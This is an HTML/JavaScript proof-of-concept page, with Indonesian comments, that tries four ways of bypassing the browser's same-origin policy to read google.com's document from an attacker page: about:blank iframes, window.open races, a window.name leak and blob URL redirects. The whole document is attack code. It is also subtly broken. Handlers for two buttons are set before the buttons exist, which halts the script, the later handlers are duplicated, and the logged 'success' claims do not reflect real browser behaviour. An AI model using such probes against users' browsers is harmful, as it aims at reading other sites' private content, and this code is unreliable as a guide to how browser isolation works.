<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>SOP Bypass via about:blank Defect</title>
<style>
  body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
  #log { background: #000; padding: 15px; border: 1px solid #444; height: 300px; overflow-y: auto; white-space: pre-wrap; margin-top: 20px; }
  .success { color: #4caf50; font-weight: bold; }
  .error { color: #f44336; font-weight: bold; }
  .info { color: #2196f3; }
  button { padding: 10px 20px; background: #0e639c; color: #fff; border: none; cursor: pointer; margin: 5px; }
  button:hover { background: #1177bb; }
  iframe { width: 100%; height: 300px; border: 2px solid #555; margin-top: 20px; background: #fff; }
</style>
</head>
<body>

<h1>SOP Bypass Test (about:blank -> google.com)</h1>
<button id="btn1">Uji Iframe about:blank</button>
<button id="btn2">Uji Window.open about:blank</button>
<button id="clear">Bersihkan Log</button>
<div id="log">Menunggu...</div>
<div id="frameContainer"></div>

<script>
const logEl = document.getElementById('log');

function log(msg, type = '') {
  const time = new Date().toISOString().substr(11, 8);
  const line = `[${time}] ${msg}\n`;
  logEl.innerHTML += type ? `<span class="${type}">${line}</span>` : line;
  logEl.scrollTop = logEl.scrollHeight;
  console.log(msg);
}

document.getElementById('clear').onclick = () => { logEl.innerHTML = ''; };

// ============================================
// METODE 1: Iframe about:blank -> google.com
// ============================================
document.getElementById('btn1').onclick = () => {
  log('=== METODE 1: Iframe about:blank ===', 'info');
  const container = document.getElementById('frameContainer');
  container.innerHTML = '';

  // 1. Buat iframe kosong
  const iframe = document.createElement('iframe');
  iframe.src = 'about:blank';
  container.appendChild(iframe);
  log('Iframe about:blank dibuat.', 'info');

  // 2. Tunggu iframe siap, lalu ubah ke Google
  setTimeout(() => {
    try {
      // Coba akses dokumen about:blank (ini pasti bisa karena same-origin)
      log('Mengubah src ke google.com...', 'info');
      iframe.src = 'https://www.google.com';

      // 3. Tunggu sebentar (misal 500ms), lalu coba akses DOM
      setTimeout(() => {
        try {
          // Coba akses document dari iframe
          const doc = iframe.contentDocument || iframe.contentWindow.document;
          if (doc) {
            log('✅ BERHASIL AKSES DOKUMEN! (SOP Bypass)', 'success');
            log('Title: ' + doc.title, 'success');
            log('URL: ' + doc.location.href, 'success');
          } else {
            log('❌ Dokumen kosong/null.', 'error');
          }
        } catch (e) {
          log('❌ Gagal akses dokumen (SOP memblokir): ' + e.message, 'error');
        }
      }, 500);

    } catch (e) {
      log('❌ Error saat navigasi: ' + e.message, 'error');
    }
  }, 100);
};

// ============================================
// METODE 2: Window.open about:blank -> google.com
// ============================================
document.getElementById('btn2').onclick = () => {
  log('=== METODE 2: Window.open about:blank ===', 'info');

  // 1. Buka window kosong
  const win = window.open('about:blank', '_blank');
  if (!win) {
    log('❌ Popup diblokir.', 'error');
    return;
  }
  log('Window kosong dibuka.', 'info');

  // 2. Ubah location ke Google
  try {
    win.location = 'https://www.google.com';
    log('Navigasi ke google.com dikirim.', 'info');
  } catch (e) {
    log('❌ Gagal navigasi: ' + e.message, 'error');
  }

  // 3. Coba akses DOM segera setelah navigasi (Race Condition)
  setTimeout(() => {
    try {
      const doc = win.document;
      if (doc) {
        log('✅ BERHASIL AKSES WINDOW.DOCUMENT! (SOP Bypass)', 'success');
        log('Title: ' + doc.title, 'success');
      } else {
        log('❌ Dokumen null.', 'error');
      }
    } catch (e) {
      log('❌ Gagal akses window (SOP memblokir): ' + e.message, 'error');
    }
  }, 500);
};

// ============================================
// METODE 3: Trik "window.name" (kadang lolos)
// ============================================
document.getElementById('btn3').onclick = () => {
  log('=== METODE 3: window.name Leak ===', 'info');
  
  const iframe = document.createElement('iframe');
  iframe.src = 'about:blank';
  iframe.name = 'leak_test'; // Set name
  document.body.appendChild(iframe);
  
  // Coba kirim payload via name
  iframe.contentWindow.name = 'secret_data_123';
  
  // Ubah ke google
  iframe.src = 'https://www.google.com';
  
  setTimeout(() => {
    try {
      // Coba baca name dari iframe yang sekarang berisi Google
      const name = iframe.contentWindow.name;
      log('Nama window: ' + name, name === 'secret_data_123' ? 'success' : 'info');
    } catch (e) {
      log('❌ Gagal baca name: ' + e.message, 'error');
    }
  }, 1000);
};

// ============================================
// METODE 4: Blob URL -> Google (kadang mewarisi origin)
// ============================================
document.getElementById('btn4').onclick = () => {
  log('=== METODE 4: Blob URL Defect ===', 'info');
  
  const html = '<html><body><h1>Blank</h1><script>window.location="https://www.google.com"<\/script></body></html>';
  const blob = new Blob([html], {type: 'text/html'});
  const url = URL.createObjectURL(blob);
  
  const iframe = document.createElement('iframe');
  iframe.src = url;
  document.body.appendChild(iframe);
  
  setTimeout(() => {
    try {
      const doc = iframe.contentDocument;
      if (doc) {
        log('✅ Bisa akses dokumen setelah blob redirect ke Google!', 'success');
        log('Title: ' + doc.title, 'success');
      } else {
        log('❌ Blob origin terpisah.', 'info');
      }
    } catch (e) {
      log('❌ Gagal: ' + e.message, 'error');
    }
  }, 1500);
};

// Tambahkan tombol ke-3 dan ke-4 ke DOM
const controls = document.createElement('div');
controls.innerHTML = `
  <button id="btn3" style="padding:10px; margin:5px;">Uji window.name</button>
  <button id="btn4" style="padding:10px; margin:5px;">Uji Blob URL Redirect</button>
`;
document.body.insertBefore(controls, document.getElementById('log'));

// Re-bind after insertion
document.getElementById('btn3').onclick = () => {
  log('=== METODE 3: window.name Leak ===', 'info');
  const iframe = document.createElement('iframe');
  iframe.src = 'about:blank';
  iframe.name = 'leak_test';
  document.body.appendChild(iframe);
  iframe.contentWindow.name = 'secret_data_123';
  iframe.src = 'https://www.google.com';
  setTimeout(() => {
    try {
      const name = iframe.contentWindow.name;
      log('Nama window: ' + name, name === 'secret_data_123' ? 'success' : 'info');
    } catch (e) {
      log('❌ Gagal baca name: ' + e.message, 'error');
    }
  }, 1000);
};

document.getElementById('btn4').onclick = () => {
  log('=== METODE 4: Blob URL Defect ===', 'info');
  const html = '<html><body><h1>Blank</h1><script>window.location="https://www.google.com"<\/script></body></html>';
  const blob = new Blob([html], {type: 'text/html'});
  const url = URL.createObjectURL(blob);
  const iframe = document.createElement('iframe');
  iframe.src = url;
  document.body.appendChild(iframe);
  setTimeout(() => {
    try {
      const doc = iframe.contentDocument;
      if (doc) {
        log('✅ Bisa akses dokumen setelah blob redirect ke Google!', 'success');
        log('Title: ' + doc.title, 'success');
      } else {
        log('❌ Blob origin terpisah.', 'info');
      }
    } catch (e) {
      log('❌ Gagal: ' + e.message, 'error');
    }
  }, 1500);
};

</script>
</body>
</html>
